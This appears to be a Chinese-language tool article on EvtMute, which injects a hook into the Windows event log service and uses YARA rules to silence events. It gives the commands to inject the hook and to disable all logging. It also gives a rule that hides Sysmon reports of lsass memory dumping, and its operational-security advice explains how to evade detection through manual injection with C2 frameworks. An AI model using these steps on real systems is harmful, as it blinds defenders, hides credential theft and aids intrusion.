![](https://image.3001.net/images/20210123/1611398504_600bfd680f54504aea599.jpg!small)

## 写在前面的话

在这篇文章中，我们将告诉大家如何使用EvtMute来对Windows事件日志进行筛选过滤。EvtMute这款工具允许我们使用[
_YARA_](http://virustotal.github.io/yara/)来进行攻击性操作，并对已经报告给Windows事件日志的事件进行过滤和筛选。

## 工具下载

广大研究人员可以使用下列命令将该项目克隆至本地：

    
    
    git clone https://github.com/bats3c/EvtMute

或者，大家也可以直接点击【[
_这里_](https://github.com/bats3c/EvtMute/releases/tag/v1.0)】访问该项目的Releases也买你来下载最新的EvtMute已编译版本。

![](https://image.3001.net/images/20210123/1611398518_600bfd76f0139e100b9b1.png!small)

## 工具使用

EvtMuteHook.dll中包含的是该工具的核心功能，成功注入之后，它将会应用一个临时过滤器，允许报告所有事件，这个过滤器可以动态更新，而不必重新注入。而SharpEvtMute.exe则是一个C#程序集，它可以通过在shad0w中执行或在Cobalt
Strike中轻松运行程序集。为了更好地与shad0w集成，我还打算用C编写原生版本。

### 禁用日志记录

最常见的EvtMute使用场景就是禁用系统范围内的事件日志记录了，此时我们可以应用下列Yara规则：

    
    
    rule disable { condition: true }

此时，我们首先需要通过向事件（event）服务中注入钩子：

    
    
    .\SharpEvtMute.exe --Inject

![](https://image.3001.net/images/20210123/1611398536_600bfd8834cbfe5b0fa93.png!small)

钩子设置好之后，我们就可以开始添加过滤器了：

    
    
    .\SharpEvtMute.exe --Filter "rule disable { condition: true }"

![](https://image.3001.net/images/20210123/1611398546_600bfd922e1337fcdacc7.png!small)

现在，event服务将会忽略所有的事件。

## 复杂型过滤器

EvtMute的过滤器是可以动态变更的，而且无需重新注入钩子，这样可以方便广大研究人员随时轻松更新原有的过滤器以及过滤规则。

更加复杂的过滤器示例如下，它能够它能够阻止sysmon报告与lsass内存转储相关的事件：

    
    
    rule block_lsass_dump {
    
        meta:
    
            author = "@_batsec_"
    
            description = "Prevent lsass dumping being reported by sysmon"
    
        strings:
    
            $provider = "Microsoft-Windows-Sysmon"
    
            $image = "lsass.exe" nocase
    
            $access = "GrantedAccess"
    
            $type = "0x1fffff"
    
        condition:
    
            all of them
    
    }

像这样复杂的Yara规则，我们很难去将其浓缩成一行“代码”，这也就是为什么我在EvtMute中添加了Base64编码功能。

这个规则可以使用Linux命令行终端轻松转换为Base64编码规则：

    
    
    base64 -w 0 YaraFilters/lsassdump.yar | echo $(</dev/stdin)

接下来，可以使用--Encoded选项将其传递给过滤器：

![](https://image.3001.net/images/20210123/1611398567_600bfda79c71d71393112.png!small)

## 操作安全注意事项

注入钩子时，SharpEvtMute.exe将会调用CreateRemoteThread，而且这个调用是在钩子设置之前进行的，因此它会被Sysmon捕捉并报告，这是因为SharpEvtMute.exe文件只能用作PoC。因此，我建议大家手动将EvtMuteHook.dll注入到事件日志服务之中。

它的进程PID可以通过运行下列命令来查看，你还可以通过C2框架来将钩子手动注入至shellcode中。

值得一提的是，钩子将使用命名管道来更新过滤器，命名的管道名为EvtMuteHook_Rule_Pipe。

## 项目地址

EvtMute：【[ _GitHub传送门_](https://github.com/bats3c/EvtMute)】

